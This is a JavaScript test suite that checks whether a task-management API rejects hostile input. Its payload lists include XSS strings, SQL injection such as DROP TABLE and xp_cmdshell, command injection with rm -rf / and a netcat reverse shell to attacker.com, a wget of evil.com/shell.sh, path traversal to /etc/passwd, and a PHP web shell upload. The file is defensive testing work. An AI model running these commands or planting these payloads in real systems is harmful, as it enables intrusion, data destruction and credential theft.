const request = require('supertest');
const app = require('../../src/app');
const { FactoryManager } = require('../factories');

describe('Input Validation Security Tests', () => {
  let factory, user, token, project;

  beforeEach(async () => {
    factory = new FactoryManager(global.testUtils.prisma);
    
    // Create authenticated user for testing
    const userData = await factory.user.createWithToken();
    user = userData.user;
    token = userData.token;

    // Create project for task tests
    const { organization } = await factory.user.createWithOrganization({}, { id: user.id });
    project = await factory.project.create({
      organizationId: organization.id,
      createdBy: user.id
    });
  });

  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert("xss")',
      '<svg onload="alert(1)">',
      '"><script>alert("xss")</script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload="alert(1)">',
      '<div onclick="alert(1)">Click me</div>'
    ];

    it('should reject XSS in task title', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/tasks')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: payload,
            projectId: project.id
          })
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
        expect(response.body.error.details).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              field: 'title',
              message: expect.stringContaining('HTML tags')
            })
          ])
        );
      }
    });

    it('should reject XSS in task description', async () => {
      const xssPayload = '<script>document.cookie="stolen"</script>';
      
      const response = await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${token}`)
        .send({
          title: 'Valid Title',
          description: xssPayload,
          projectId: project.id
        })
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should reject XSS in project name', async () => {
      const { organization } = await factory.user.createWithOrganization({}, { id: user.id });
      
      const response = await request(app)
        .post('/api/projects')
        .set('Authorization', `Bearer ${token}`)
        .send({
          name: '<script>alert("xss")</script>',
          organizationId: organization.id
        })
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should reject XSS in user profile update', async () => {
      const response = await request(app)
        .put('/api/users/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({
          name: '<img src="x" onerror="alert(1)">'
        })
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users VALUES('hacker', 'password'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "1' OR '1'='1' --",
      "' OR 1=1#",
      "'; EXEC xp_cmdshell('format c:'); --"
    ];

    it('should prevent SQL injection in search queries', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/tasks')
          .query({ search: payload })
          .set('Authorization', `Bearer ${token}`)
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should prevent SQL injection in filter parameters', async () => {
      const response = await request(app)
        .get('/api/tasks')
        .query({ 
          status: "'; DROP TABLE tasks; --",
          priority: "' OR '1'='1"
        })
        .set('Authorization', `Bearer ${token}`)
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should prevent SQL injection in task creation', async () => {
      const response = await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${token}`)
        .send({
          title: "Task'; DROP TABLE tasks; --",
          projectId: project.id
        })
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should reject MongoDB-style injection attempts', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'function() { return true; }' }
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .post('/api/tasks')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: payload,
            projectId: project.id
          })
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '$(rm -rf /)',
      '`rm -rf /`',
      '; rm -rf /',
      '| rm -rf /',
      '&& rm -rf /',
      '; cat /etc/passwd',
      '`cat /etc/passwd`',
      '$(cat /etc/passwd)',
      '; nc -e /bin/sh attacker.com 4444',
      '| wget http://evil.com/shell.sh'
    ];

    it('should prevent command injection in task titles', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/tasks')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: payload,
            projectId: project.id
          })
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ];

    it('should prevent directory traversal in file uploads', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .post(`/api/tasks/${project.id}/attachments`)
          .set('Authorization', `Bearer ${token}`)
          .attach('file', Buffer.from('test content'), payload)
          .expect(400);

        expect(response.body.error.message).toContain('Invalid filename');
      }
    });
  });

  describe('Data Type Validation', () => {
    it('should validate UUID format for IDs', async () => {
      const invalidUUIDs = [
        '123',
        'not-a-uuid',
        '12345678-1234-1234-1234-123456789abc-extra',
        '12345678-1234-1234-1234-123456789'
      ];

      for (const invalidId of invalidUUIDs) {
        const response = await request(app)
          .get(`/api/tasks/${invalidId}`)
          .set('Authorization', `Bearer ${token}`)
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should validate email format in user registration', async () => {
      const invalidEmails = [
        'not-an-email',
        '@domain.com',
        'user@',
        'user@domain',
        'user space@domain.com',
        'user@domain@com'
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email,
            name: 'Test User',
            password: 'SecurePassword123!'
          })
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should validate date format for due dates', async () => {
      const invalidDates = [
        'not-a-date',
        '2023-13-32', // Invalid month/day
        '2023/01/01', // Wrong format
        '01-01-2023', // Wrong format
        'yesterday',
        '2023-01-32T25:61:61Z' // Invalid time
      ];

      for (const date of invalidDates) {
        const response = await request(app)
          .post('/api/tasks')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: 'Test Task',
            projectId: project.id,
            dueDate: date
          })
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should validate enum values for task status', async () => {
      const invalidStatuses = [
        'invalid-status',
        'COMPLETED', // Case sensitivity
        'in-progress', // Wrong format
        'pending',
        123,
        null
      ];

      // First create a task
      const task = await factory.task.create({
        projectId: project.id,
        createdBy: user.id
      });

      for (const status of invalidStatuses) {
        const response = await request(app)
          .put(`/api/tasks/${task.id}`)
          .set('Authorization', `Bearer ${token}`)
          .send({ status })
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });
  });

  describe('Input Length Validation', () => {
    it('should enforce maximum length for task titles', async () => {
      const longTitle = 'A'.repeat(256); // Assuming max is 255

      const response = await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${token}`)
        .send({
          title: longTitle,
          projectId: project.id
        })
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should enforce maximum length for descriptions', async () => {
      const longDescription = 'A'.repeat(2001); // Assuming max is 2000

      const response = await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${token}`)
        .send({
          title: 'Valid Title',
          description: longDescription,
          projectId: project.id
        })
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should reject empty required fields', async () => {
      const response = await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${token}`)
        .send({
          title: '', // Empty required field
          projectId: project.id
        })
        .expect(400);

      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });
  });

  describe('Content-Type Validation', () => {
    it('should reject non-JSON content for JSON endpoints', async () => {
      const response = await request(app)
        .post('/api/tasks')
        .set('Authorization', `Bearer ${token}`)
        .set('Content-Type', 'text/plain')
        .send('title=Test&projectId=123')
        .expect(400);

      expect(response.body.error.code).toBe('INVALID_CONTENT_TYPE');
    });

    it('should validate file types for uploads', async () => {
      const task = await factory.task.create({
        projectId: project.id,
        createdBy: user.id
      });

      const response = await request(app)
        .post(`/api/tasks/${task.id}/attachments`)
        .set('Authorization', `Bearer ${token}`)
        .attach('file', Buffer.from('<?php system($_GET["cmd"]); ?>'), 'malicious.php')
        .expect(400);

      expect(response.body.error.message).toContain('File type not allowed');
    });
  });

  describe('Rate Limiting Validation', () => {
    it('should enforce rate limits on input validation', async () => {
      const promises = [];
      
      // Send multiple invalid requests rapidly
      for (let i = 0; i < 20; i++) {
        promises.push(
          request(app)
            .post('/api/tasks')
            .set('Authorization', `Bearer ${token}`)
            .send({
              title: '<script>alert("xss")</script>',
              projectId: project.id
            })
        );
      }

      const responses = await Promise.all(promises);
      
      // Should have some rate limited responses
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Unicode and Encoding Validation', () => {
    it('should handle Unicode characters safely', async () => {
      const unicodeStrings = [
        '测试任务', // Chinese
        'тестовая задача', // Russian
        'مهمة اختبار', // Arabic
        '🚀 Rocket Task 🚀', // Emojis
        'Ñoño niño', // Special characters
      ];

      for (const title of unicodeStrings) {
        const response = await request(app)
          .post('/api/tasks')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title,
            projectId: project.id
          })
          .expect(201);

        expect(response.body.data.title).toBe(title);
      }
    });

    it('should reject dangerous Unicode sequences', async () => {
      const dangerousUnicode = [
        '\u202e', // Right-to-Left Override
        '\ufeff', // Zero Width No-Break Space
        '\u200b', // Zero Width Space
        '\u2028', // Line Separator
        '\u2029'  // Paragraph Separator
      ];

      for (const char of dangerousUnicode) {
        const response = await request(app)
          .post('/api/tasks')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: `Task${char}Title`,
            projectId: project.id
          })
          .expect(400);

        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });
  });
});